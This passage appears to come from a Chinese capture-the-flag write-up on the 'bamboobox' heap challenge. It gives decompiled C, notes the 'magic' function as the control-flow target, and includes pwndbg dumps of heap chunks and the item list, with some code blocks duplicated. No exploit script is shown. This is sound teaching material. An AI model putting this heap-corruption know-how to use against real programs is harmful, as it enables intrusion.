class="hljs-number">1</span>]();<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>      <span class="hljs-keyword">default</span>:<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">"invaild choice!!!"</span>);<br>        <span class="hljs-keyword"><code class="language-hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>{<br>  <span class="hljs-type">void</span> (**v4)(<span class="hljs-type">void</span>); <span class="hljs-comment">// [rsp+8h] [rbp-18h]</span><br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">8</span>]; <span class="hljs-comment">// [rsp+10h] [rbp-10h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v6; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br><br>  v6 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  v4 = (<span class="hljs-type">void</span> (**)(<span class="hljs-type">void</span>))<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>uLL);<br>  *v4 = (<span class="hljs-type">void</span> (*)(<span class="hljs-type">void</span>))hello_message;<br>  v4[<span class="hljs-number">1</span>] = (<span class="hljs-type">void</span> (*)(<span class="hljs-type">void</span>))goodbye_message;<br>  (*v4)();<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  {<br>    menu();<br>    read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">8uLL</span>);<br>    <span class="hljs-keyword">switch</span> ( atoi(buf) )<br>    {<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>        show_item();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>        add_item();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>        change_item(buf, buf);<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>        remove_item();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">5</span>:<br>        v4[<span class="hljs-number">1</span>]();<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>      <span class="hljs-keyword">default</span>:<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">"invaild choice!!!"</span>);<br>        <span class="hljs-keyword">break</span>;<br>    }<br>  }<br>}<br></code></pre></td></tr></tbody></table></figure><p>​main函数其实没有什么好说的，但是值得注意的是程序开头就申请了一片堆空间来存放hello_message和goodbye_message，并在程序开始的时候调用hello_message和在程序结束的时候调用goodbye_message。</p><h3 id="meau函数"><a href="#meau函数" class="headerlink" title="meau函数"></a>meau函数</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre class=" language-hljs c"><span class="hljs-type">void</span> __cdecl <span class="hljs-title function_">menu</span><span class="hljs-params">()</span><br>{<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"----------------------------"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Bamboobox Menu"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"----------------------------"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"1.show the items in the box"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"2.add a new item"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"3.change the item in the box"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"4.remove the item in the box"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"5.exit"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"----------------------------"</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string"><code class="language-hljs c"><span class="hljs-type">void</span> __cdecl <span class="hljs-title function_">menu</span><span class="hljs-params">()</span><br>{<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"----------------------------"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Bamboobox Menu"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"----------------------------"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"1.show the items in the box"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"2.add a new item"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"3.change the item in the box"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"4.remove the item in the box"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"5.exit"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"----------------------------"</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Your choice:"</span>);<br>}<br></code></pre></td></tr></tbody></table></figure><p>这是一个程序的菜单函数，没有什么特别的。</p><h3 id="show-item"><a href="#show-item" class="headerlink" title="show_item"></a>show_item</h3><p class='item-img' data-src='E:\myblog\hexoblog\source\picture\image-20230912091832878.png'><img src="E:\myblog\hexoblog\source\picture\image-20230912091832878.png" alt="image-20230912091832878"></p><p>首先判断存放于bss段的全局变量num是否有数据，然后进入循环打印程序各个结构体的内容，没有什么好看的。</p><h3 id="add-item"><a href="#add-item" class="headerlink" title="add_item"></a>add_item</h3><p class='item-img' data-src='E:\myblog\hexoblog\source\picture\image-20230912092037725.png'><img src="E:\myblog\hexoblog\source\picture\image-20230912092037725.png" alt="image-20230912092037725"></p><p>首先根据num判断是否堆满了，然后根据堆结构体写入数据</p><h3 id="change-item"><a href="#change-item" class="headerlink" title="change_item"></a>change_item</h3><p class='item-img' data-src='E:\myblog\hexoblog\source\picture\image-20230912092541664.png'><img src="E:\myblog\hexoblog\source\picture\image-20230912092541664.png" alt="image-20230912092541664"></p><h3 id="remove-item"><a href="#remove-item" class="headerlink" title="remove_item"></a>remove_item</h3><p class='item-img' data-src='E:\myblog\hexoblog\source\picture\image-20230912092703105.png'><img src="E:\myblog\hexoblog\source\picture\image-20230912092703105.png" alt="image-20230912092703105"></p><p>程序free的很干净，不存在uaf</p><h3 id="magic"><a href="#magic" class="headerlink" title="magic"></a>magic</h3><p class='item-img' data-src='E:\myblog\hexoblog\source\picture\image-20230912092723857.png'><img src="E:\myblog\hexoblog\source\picture\image-20230912092723857.png" alt="image-20230912092723857"></p><p>目标地址，控制程序执行流到magic函数的位置即可get flag</p><h3 id="结构体"><a href="#结构体" class="headerlink" title="结构体"></a>结构体</h3><p class='item-img' data-src='E:\myblog\hexoblog\source\picture\image-20230912092850070.png'><img src="E:\myblog\hexoblog\source\picture\image-20230912092850070.png" alt="image-20230912092850070"></p><p>对应c代码的 item 结构体</p><h2 id="pwndbg-动态调试"><a href="#pwndbg-动态调试" class="headerlink" title="pwndbg 动态调试"></a>pwndbg 动态调试</h2><h3 id="堆内存分布"><a href="#堆内存分布" class="headerlink" title="堆内存分布"></a>堆内存分布</h3><p>首先使用gdb动态调试程序，创建两个堆块，然后进入调试模式，详细信息如下面的代码框所示：</p><ul><li>chunk0:size=10，content=”aaaaa”</li><li>chunk1:size=20，content=”bbbbb”</li></ul><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre class=" language-hljs c">giantbranch@ubuntu:/mnt/hgfs/PWN题/Range/ctfshow/ctf-pwn-challenges/heap/house-of-force/hitcontrani<br>ng_lab11$ gdb bamboobox<br>GNU <span class="hljs-title function_">gdb</span> <span class="hljs-params">(Ubuntu <span class="hljs-number">7.11</span><span class="hljs-number">.1</span><span class="hljs-number">-0u</span>buntu1~<span class="hljs-number">16.5</span>)</span> 7.11.1<br><span class="hljs-title function_">Copyright</span> <span class="hljs-params">(C)</span> 2016 Free Software Foundation, Inc.<br>License GPLv3+: GNU GPL version 3 or later &lt;http:<span class="hljs-comment">//gnu.org/licenses/gpl.html&gt;</span><br>This is <span class="hljs-built_in">free</span> software: you are <span class="hljs-built_in">free</span> to change and redistribute it.<br>There is NO WARRANTY, to the extent permitted by law.  Type "show copying"<br>and "show warranty" <span class="hljs-keyword">for</span> details.<br>This GDB was configured as "x86_64-linux-gnu".<br>Type "show configuration" <span class="hljs-keyword">for</span> configuration details.<br>For bug reporting instructions, please see:<br>&lt;http:<span class="hljs-comment">//www.gnu.org/software/gdb/bugs/&gt;.</span><br>Find the GDB manual and other documentation resources online at:<br>&lt;http:<span class="hljs-comment">//www.gnu.org/software/gdb/documentation/&gt;.</span><br>For help, type "help".<br>Type "apropos word" to search <span class="hljs-keyword">for</span> commands related to "word"...<br>pwndbg: loaded 175 commands. Type pwndbg [filter] <span class="hljs-keyword">for</span> a <span class="hljs-built_in">list</span>.<br>pwndbg: created $rebase, $ida gdb <span class="hljs-title function_">functions</span> <span class="hljs-params">(can be used with print/<span class="hljs-keyword">break</span>)</span><br>Reading symbols from bamboobox...<span class="hljs-params">(no debugging symbols found)</span>...done.<br>pwndbg&gt; r<br>Starting program: /mnt/hgfs/PWN题/Range/ctfshow/ctf-pwn-challenges/heap/house-of-force/hitcontraning_lab11/bamboobox <br>There is a box with magic<br>what <span class="hljs-keyword">do</span> you want to <span class="hljs-keyword">do</span> in the box<br>----------------------------<br>Bamboobox Menu<br>----------------------------<br>1.show the items in the box<br>2.add a new item<br>3.change the item in the box<br>4.remove the item in the box<br>5.<span class="hljs-built_in">exit</span><br>----------------------------<br>Your choice:2<br>Please enter the length of item name:10<br>Please enter the name of item:aaaaa<br>----------------------------<br>Bamboobox Menu<br>----------------------------<br>1.show the items in the box<br>2.add a new item<br>3.change the item in the box<br>4.remove the item in the box<br>5.<span class="hljs-built_in">exit</span><br>----------------------------<br>Your choice:2<br>Please enter the length of item name:20<br>Please enter the name of item:bbbbb<br>----------------------------<br>Bamboobox Menu<br>----------------------------<br>1.show the items in the box<br>2.add a new item<br>3.change the item in the box<br>4.remove the item in the box<br>5.<span class="hljs-built_in">exit</span><br>----------------------------<br>Your choice:^C<br>Program received signal SIGINT, Interrupt.<br>0x00007ffff7b04360 in __<span class="hljs-title function_">read_nocancel</span> <span class="hljs-params">()</span> at ../sysdeps/unix/syscall-template.S:84<br>84../sysdeps/unix/syscall-template.S: No such file or directory.<br>LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA<br>───────────────────────────────────────────[ REGISTERS ]───────────────────────────────────────────<br> RAX  0xfffffffffffffe00<br> RBX  0x0<br> RCX  0<span class="hljs-title function_">x7ffff7b04360</span> <span class="hljs-params">(__read_nocancel+<span class="hljs-number">7</span>)</span> ◂— cmp    rax, -0xfff<br> RDX  0x8<br> RDI  0x0<br> RSI  0x7fffffffdc40 —▸ 0x7fffffff0a32 ◂— 0x0<br> R8   0x7ffff7fdd700 ◂— 0x7ffff7fdd700<br> R9   0xc<br> R10  0x0<br> R11  0x246<br> R12  0<span class="hljs-title function_">x4007a0</span> <span class="hljs-params">(_start)</span> ◂— xor    ebp, ebp<br> R13  0x7fffffffdd30 ◂— 0x1<br> R14  0x0<br> R15  0x0<br> RBP  0x7fffffffdc50 —▸ 0<span class="hljs-title function_">x400ee0</span> <span class="hljs-params">(__libc_csu_init)</span> ◂— push   r15<br> RSP  0x7fffffffdc28 —▸ 0<span class="hljs-title function_">x400e5d</span> <span class="hljs-params">(main+<span class="hljs-number">166</span>)</span> ◂— lea    rax, [rbp - 0x10]<br> RIP  0<span class="hljs-title function_">x7ffff7b04360</span> <span class="hljs-params">(__read_nocancel+<span class="hljs-number">7</span>)</span> ◂— cmp    rax, -0xfff<br>────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────<br> ► 0x7ffff7b04360 &lt;__read_nocancel+7&gt;     cmp    rax, -0xfff<br>   0x7ffff7b04366 &lt;__read_nocancel+13&gt;    jae    read+73 &lt;0x7ffff7b04399&gt;<br>    ↓<br>   0x7ffff7b04399 &lt;read+73&gt;               mov    rcx, qword ptr [rip + 0x2ccad8]<br>   0x7ffff7b043a0 &lt;read+80&gt;               neg    eax<br>   0x7ffff7b043a2 &lt;read+82&gt;               mov    dword ptr fs:[rcx], eax<br>   0x7ffff7b043a5 &lt;read+85&gt;               or     rax, 0xffffffffffffffff<br>   0x7ffff7b043a9 &lt;read+89&gt;               ret    <br> <br>   0x7ffff7b043aa                         nop    word ptr [rax + rax]<br>   0x7ffff7b043b0 &lt;write&gt;                 cmp    dword ptr [rip + 0x2d2389], 0 &lt;0x7ffff7dd6740&gt;<br>   0x7ffff7b043b7 &lt;write+7&gt;               jne    write+25 &lt;0x7ffff7b043c9&gt;<br>    ↓<br>   0x7ffff7b043c9 &lt;write+25&gt;              sub    rsp, 8<br>─────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────<br>00:0000│ rsp  0x7fffffffdc28 —▸ 0<span class="hljs-title function_">x400e5d</span> <span class="hljs-params">(main+<span class="hljs-number">166</span>)</span> ◂— lea    rax, [rbp - 0x10]<br>01:0008│      0x7fffffffdc30 ◂— 0x200400ee0<br>02:0010│      0x7fffffffdc38 —▸ 0x603010 —▸ 0<span class="hljs-title function_">x400896</span> <span class="hljs-params">(hello_message)</span> ◂— push   rbp<br>03:0018│ rsi  0x7fffffffdc40 —▸ 0x7fffffff0a32 ◂— 0x0<br>04:0020│      0x7fffffffdc48 ◂— 0x2b1241ff949c6b00<br>05:0028│ rbp  0x7fffffffdc50 —▸ 0<span class="hljs-title function_">x400ee0</span> <span class="hljs-params">(__libc_csu_init)</span> ◂— push   r15<br>06:0030│      0x7fffffffdc58 —▸ 0<span class="hljs-title function_">x7ffff7a2d840</span> <span class="hljs-params">(__libc_start_main+<span class="hljs-number"><code class="language-hljs c">giantbranch@ubuntu:/mnt/hgfs/PWN题/Range/ctfshow/ctf-pwn-challenges/heap/house-of-force/hitcontrani<br>ng_lab11$ gdb bamboobox<br>GNU <span class="hljs-title function_">gdb</span> <span class="hljs-params">(Ubuntu <span class="hljs-number">7.11</span><span class="hljs-number">.1</span><span class="hljs-number">-0u</span>buntu1~<span class="hljs-number">16.5</span>)</span> 7.11.1<br><span class="hljs-title function_">Copyright</span> <span class="hljs-params">(C)</span> 2016 Free Software Foundation, Inc.<br>License GPLv3+: GNU GPL version 3 or later &lt;http:<span class="hljs-comment">//gnu.org/licenses/gpl.html&gt;</span><br>This is <span class="hljs-built_in">free</span> software: you are <span class="hljs-built_in">free</span> to change and redistribute it.<br>There is NO WARRANTY, to the extent permitted by law.  Type "show copying"<br>and "show warranty" <span class="hljs-keyword">for</span> details.<br>This GDB was configured as "x86_64-linux-gnu".<br>Type "show configuration" <span class="hljs-keyword">for</span> configuration details.<br>For bug reporting instructions, please see:<br>&lt;http:<span class="hljs-comment">//www.gnu.org/software/gdb/bugs/&gt;.</span><br>Find the GDB manual and other documentation resources online at:<br>&lt;http:<span class="hljs-comment">//www.gnu.org/software/gdb/documentation/&gt;.</span><br>For help, type "help".<br>Type "apropos word" to search <span class="hljs-keyword">for</span> commands related to "word"...<br>pwndbg: loaded 175 commands. Type pwndbg [filter] <span class="hljs-keyword">for</span> a <span class="hljs-built_in">list</span>.<br>pwndbg: created $rebase, $ida gdb <span class="hljs-title function_">functions</span> <span class="hljs-params">(can be used with print/<span class="hljs-keyword">break</span>)</span><br>Reading symbols from bamboobox...<span class="hljs-params">(no debugging symbols found)</span>...done.<br>pwndbg&gt; r<br>Starting program: /mnt/hgfs/PWN题/Range/ctfshow/ctf-pwn-challenges/heap/house-of-force/hitcontraning_lab11/bamboobox <br>There is a box with magic<br>what <span class="hljs-keyword">do</span> you want to <span class="hljs-keyword">do</span> in the box<br>----------------------------<br>Bamboobox Menu<br>----------------------------<br>1.show the items in the box<br>2.add a new item<br>3.change the item in the box<br>4.remove the item in the box<br>5.<span class="hljs-built_in">exit</span><br>----------------------------<br>Your choice:2<br>Please enter the length of item name:10<br>Please enter the name of item:aaaaa<br>----------------------------<br>Bamboobox Menu<br>----------------------------<br>1.show the items in the box<br>2.add a new item<br>3.change the item in the box<br>4.remove the item in the box<br>5.<span class="hljs-built_in">exit</span><br>----------------------------<br>Your choice:2<br>Please enter the length of item name:20<br>Please enter the name of item:bbbbb<br>----------------------------<br>Bamboobox Menu<br>----------------------------<br>1.show the items in the box<br>2.add a new item<br>3.change the item in the box<br>4.remove the item in the box<br>5.<span class="hljs-built_in">exit</span><br>----------------------------<br>Your choice:^C<br>Program received signal SIGINT, Interrupt.<br>0x00007ffff7b04360 in __<span class="hljs-title function_">read_nocancel</span> <span class="hljs-params">()</span> at ../sysdeps/unix/syscall-template.S:84<br>84../sysdeps/unix/syscall-template.S: No such file or directory.<br>LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA<br>───────────────────────────────────────────[ REGISTERS ]───────────────────────────────────────────<br> RAX  0xfffffffffffffe00<br> RBX  0x0<br> RCX  0<span class="hljs-title function_">x7ffff7b04360</span> <span class="hljs-params">(__read_nocancel+<span class="hljs-number">7</span>)</span> ◂— cmp    rax, -0xfff<br> RDX  0x8<br> RDI  0x0<br> RSI  0x7fffffffdc40 —▸ 0x7fffffff0a32 ◂— 0x0<br> R8   0x7ffff7fdd700 ◂— 0x7ffff7fdd700<br> R9   0xc<br> R10  0x0<br> R11  0x246<br> R12  0<span class="hljs-title function_">x4007a0</span> <span class="hljs-params">(_start)</span> ◂— xor    ebp, ebp<br> R13  0x7fffffffdd30 ◂— 0x1<br> R14  0x0<br> R15  0x0<br> RBP  0x7fffffffdc50 —▸ 0<span class="hljs-title function_">x400ee0</span> <span class="hljs-params">(__libc_csu_init)</span> ◂— push   r15<br> RSP  0x7fffffffdc28 —▸ 0<span class="hljs-title function_">x400e5d</span> <span class="hljs-params">(main+<span class="hljs-number">166</span>)</span> ◂— lea    rax, [rbp - 0x10]<br> RIP  0<span class="hljs-title function_">x7ffff7b04360</span> <span class="hljs-params">(__read_nocancel+<span class="hljs-number">7</span>)</span> ◂— cmp    rax, -0xfff<br>────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────<br> ► 0x7ffff7b04360 &lt;__read_nocancel+7&gt;     cmp    rax, -0xfff<br>   0x7ffff7b04366 &lt;__read_nocancel+13&gt;    jae    read+73 &lt;0x7ffff7b04399&gt;<br>    ↓<br>   0x7ffff7b04399 &lt;read+73&gt;               mov    rcx, qword ptr [rip + 0x2ccad8]<br>   0x7ffff7b043a0 &lt;read+80&gt;               neg    eax<br>   0x7ffff7b043a2 &lt;read+82&gt;               mov    dword ptr fs:[rcx], eax<br>   0x7ffff7b043a5 &lt;read+85&gt;               or     rax, 0xffffffffffffffff<br>   0x7ffff7b043a9 &lt;read+89&gt;               ret    <br> <br>   0x7ffff7b043aa                         nop    word ptr [rax + rax]<br>   0x7ffff7b043b0 &lt;write&gt;                 cmp    dword ptr [rip + 0x2d2389], 0 &lt;0x7ffff7dd6740&gt;<br>   0x7ffff7b043b7 &lt;write+7&gt;               jne    write+25 &lt;0x7ffff7b043c9&gt;<br>    ↓<br>   0x7ffff7b043c9 &lt;write+25&gt;              sub    rsp, 8<br>─────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────<br>00:0000│ rsp  0x7fffffffdc28 —▸ 0<span class="hljs-title function_">x400e5d</span> <span class="hljs-params">(main+<span class="hljs-number">166</span>)</span> ◂— lea    rax, [rbp - 0x10]<br>01:0008│      0x7fffffffdc30 ◂— 0x200400ee0<br>02:0010│      0x7fffffffdc38 —▸ 0x603010 —▸ 0<span class="hljs-title function_">x400896</span> <span class="hljs-params">(hello_message)</span> ◂— push   rbp<br>03:0018│ rsi  0x7fffffffdc40 —▸ 0x7fffffff0a32 ◂— 0x0<br>04:0020│      0x7fffffffdc48 ◂— 0x2b1241ff949c6b00<br>05:0028│ rbp  0x7fffffffdc50 —▸ 0<span class="hljs-title function_">x400ee0</span> <span class="hljs-params">(__libc_csu_init)</span> ◂— push   r15<br>06:0030│      0x7fffffffdc58 —▸ 0<span class="hljs-title function_">x7ffff7a2d840</span> <span class="hljs-params">(__libc_start_main+<span class="hljs-number">240</span>)</span> ◂— mov    edi, eax<br>07:0038│      0x7fffffffdc60 ◂— 0x0<br>───────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────<br> ► f 0     7ffff7b04360 __read_nocancel+7<br>   f 1           400e5d main+166<br>   f 2     7ffff7a2d840 __libc_start_main+240<br>Program received signal SIGINT<br>pwndbg> <br><br></code></pre></td></tr></tbody></table></figure><p>ok，输入完成，接下来我们查看堆的分布</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre class=" language-hljs c">pwndbg&gt; heap<br>Allocated chunk | PREV_INUSE<br>Addr: <span class="hljs-number">0x603000</span><br>Size: <span class="hljs-number">0x21</span><br><br>Allocated chunk | PREV_INUSE<br>Addr: <span class="hljs-number">0x603020</span><br>Size: <span class="hljs-number">0x21</span><br><br>Allocated chunk | PREV_INUSE<br>Addr: <span class="hljs-number">0x603040</span><br>Size: <span class="hljs-number">0x21</span><br><br>Top chunk | PREV_INUSE<br>Addr: <span class="hljs-number">0x603060</span><br>Size: <span class="hljs-number"><code class="language-hljs c">pwndbg&gt; heap<br>Allocated chunk | PREV_INUSE<br>Addr: <span class="hljs-number">0x603000</span><br>Size: <span class="hljs-number">0x21</span><br><br>Allocated chunk | PREV_INUSE<br>Addr: <span class="hljs-number">0x603020</span><br>Size: <span class="hljs-number">0x21</span><br><br>Allocated chunk | PREV_INUSE<br>Addr: <span class="hljs-number">0x603040</span><br>Size: <span class="hljs-number">0x21</span><br><br>Top chunk | PREV_INUSE<br>Addr: <span class="hljs-number">0x603060</span><br>Size: <span class="hljs-number">0x20fa1</span><br><br>pwndbg> <br></code></pre></td></tr></tbody></table></figure><p>堆的内存分布</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre class=" language-hljs c">pwndbg&gt; x/<span class="hljs-number">30</span>gx <span class="hljs-number">0x603000</span><br><span class="hljs-number">0x603000</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> #func_start_malloc_chunk<br><span class="hljs-number">0x603010</span>:<span class="hljs-number">0x0000000000400896</span><span class="hljs-number">0x00000000004008b1</span><br>#hello_message      #goodbye_message<br><span class="hljs-number">0x603020</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> #chunk0<br><span class="hljs-number">0x603030</span>:<span class="hljs-number">0x00000a6161616161</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x603040</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> #chunk1<br><span class="hljs-number">0x603050</span>:<span class="hljs-number">0x00000a6262626262</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x603060</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000020fa1</span> #top_chunk<br>......(省略内容均为空)<br><span class="hljs-number">0x6030e0</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number"><code class="language-hljs c">pwndbg&gt; x/<span class="hljs-number">30</span>gx <span class="hljs-number">0x603000</span><br><span class="hljs-number">0x603000</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> #func_start_malloc_chunk<br><span class="hljs-number">0x603010</span>:<span class="hljs-number">0x0000000000400896</span><span class="hljs-number">0x00000000004008b1</span><br>#hello_message      #goodbye_message<br><span class="hljs-number">0x603020</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> #chunk0<br><span class="hljs-number">0x603030</span>:<span class="hljs-number">0x00000a6161616161</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x603040</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> #chunk1<br><span class="hljs-number">0x603050</span>:<span class="hljs-number">0x00000a6262626262</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x603060</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000020fa1</span> #top_chunk<br>......(省略内容均为空)<br><span class="hljs-number">0x6030e0</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br>pwndbg> <br></code></pre></td></tr></tbody></table></figure><h3 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h3><p class='item-img' data-src='E:\myblog\hexoblog\source\picture\image-20230912093548094.png'><img src="E:\myblog\hexoblog\source\picture\image-20230912093548094.png" alt="image-20230912093548094"></p><p class='item-img' data-src='E:\myblog\hexoblog\source\picture\image-20230912093439237.png'><img src="E:\myblog\hexoblog\source\picture\image-20230912093439237.png" alt="image-20230912093439237"></p><ul><li>num记录着堆块的数量。</li></ul><p>查看一下堆指针信息</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre class=" language-hljs c">pwndbg&gt; x/<span class="hljs-number">10</span>gx <span class="hljs-number">0x6020c0</span><br><span class="hljs-number">0x6020c0</span> &lt;itemlist&gt;:<span class="hljs-number">0x000000000000000a</span><span class="hljs-number">0x0000000000603030</span> #chunk0<br>#struct_size        #struct_content_ptr<br><span class="hljs-number">0x6020d0</span> &lt;itemlist+<span class="hljs-number">16</span>&gt;:<span class="hljs-number">0x0000000000000014</span><span class="hljs-number">0x0000000000603050</span> #chunk1<br>#struct_size        #struct_content_ptr<br><span class="hljs-number">0x6020e0</span> &lt;itemlist+<span class="hljs-number">32</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x6020f0</span> &lt;itemlist+<span class="hljs-number">48</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x602100</span> 